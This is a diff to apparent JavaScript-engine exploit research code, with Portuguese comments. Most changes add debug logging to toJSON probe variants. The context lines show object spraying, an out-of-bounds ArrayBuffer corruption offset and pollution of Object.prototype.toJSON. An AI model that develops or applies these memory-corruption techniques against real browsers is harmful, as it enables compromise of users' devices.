@@ -20,8 +20,6 @@ class MyComplexObjectForRangeError {
     }
 }
 
-// Mantenha todas as variantes para que o runAllAdvancedTestsS3 possa escolhê-las,
-// mas o runAllAdvancedTestsS3 será modificado para focar em V4.
 export const toJSON_RangeErrorVariants = {
     V0_EmptyReturn: function() { /* ... (como antes) ... */
         return { variant: "V0_EmptyReturn" };
@@ -52,8 +50,10 @@ export const toJSON_RangeErrorVariants = {
         let props = {}; let count = 0;
         const FNAME_toJSON_Internal = "V4_LoopInWithAccess_Limited";
         let last_prop_attempted_log = "N/A_LoopStart";
+        // LOG NO INÍCIO DA FUNÇÃO toJSON
+        logS3(`   [${FNAME_toJSON_Internal}] FUNÇÃO toJSON INICIADA (ID do this: ${this ? this.id : "N/A"}).`, "info", FNAME_toJSON_Internal);
         try {
-            logS3(`   [${FNAME_toJSON_Internal}] Iniciando loop for...in em 'this' (ID: ${this ? this.id : "N/A"})...`, "info", FNAME_toJSON_Internal);
+            logS3(`   [${FNAME_toJSON_Internal}] Iniciando loop for...in...`, "info", FNAME_toJSON_Internal);
             for (const p in this) {
                 count++;
                 last_prop_attempted_log = p;
@@ -72,7 +72,7 @@ export const toJSON_RangeErrorVariants = {
             return { variant: FNAME_toJSON_Internal, error: `${e.name}: ${e.message}`, props_collected: props, count_at_error: count, last_prop_attempted: last_prop_attempted_log };
         }
     },
-    V4_Dummy: function() { // Uma versão dummy da V4 para teste
+    V4_Dummy: function() { /* ... (como antes) ... */
         logS3("   [V4_Dummy toJSON] Chamada.", "info", "V4_Dummy");
         return { variant: "V4_Dummy", message: "Corpo vazio, apenas para testar a definição."};
     },
@@ -80,6 +80,7 @@ export const toJSON_RangeErrorVariants = {
         let props = {}; let keys = []; let count = 0;
         const FNAME_toJSON_Internal = "V5_ObjectKeysThenAccess_Limited";
         let last_prop_attempted_log = "N/A_LoopStart_ObjectKeys";
+         logS3(`   [${FNAME_toJSON_Internal}] FUNÇÃO toJSON INICIADA (ID do this: ${this ? this.id : "N/A"}).`, "info", FNAME_toJSON_Internal);
         try {
             keys = Object.keys(this);
             logS3(`   [${FNAME_toJSON_Internal}] Object.keys(this) retornou ${keys.length} chaves. Iterando...`, "info", FNAME_toJSON_Internal);
@@ -108,10 +109,11 @@ export async function executeProbeComplexObjectWithMinimalToJSONs(
     toJSONFunctionToUse,
     toJSONFunctionName
 ) {
+    // LOG NO INÍCIO DESTA FUNÇÃO PARA VER SE ELA É CHAMADA
     const FNAME_TEST = `executeProbeComplexObj<${toJSONFunctionName}>`;
-    logS3(`--- Iniciando Teste de Sondagem: Usando ${toJSONFunctionName} ---`, "test", FNAME_TEST);
+    logS3(`>>> [${FNAME_TEST}] INÍCIO DA FUNÇÃO. Usando ${toJSONFunctionName}. (PONTO DE VERIFICAÇÃO 0) <<<`, "test", FNAME_TEST);
 
-    const spray_count = 10; // Reduzido
+    const spray_count = 10; // Reduzido para focar
     const sprayed_objects = [];
 
     const corruption_offset_in_oob_ab = 0x70;
@@ -142,9 +144,6 @@ export async function executeProbeComplexObjectWithMinimalToJSONs(
         return { error: e_write, toJSON_name: toJSONFunctionName, stringifyResult: null };
     }
     
-    // PAUSA REMOVIDA CONFORME TESTE ANTERIOR
-    // await PAUSE_S3(100); 
-
     const ppKey_val = 'toJSON';
     let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
     let pollutionApplied = false;
